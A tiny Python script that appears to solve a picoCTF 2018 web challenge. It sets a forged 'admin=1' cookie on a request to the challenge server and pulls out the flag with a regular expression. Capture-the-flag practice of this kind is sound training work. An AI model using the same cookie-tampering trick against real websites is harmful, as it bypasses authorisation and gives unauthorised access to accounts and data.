#!/usr/bin/env/ python

import re
#regular expressions is re
import requests 

url = 'http://2018shell3.picoctf.com:6153'
r = requests.get(url, cookies = { 'admin' : '1'})
print re.findall('picoCTF{.*}',r.text)[0]
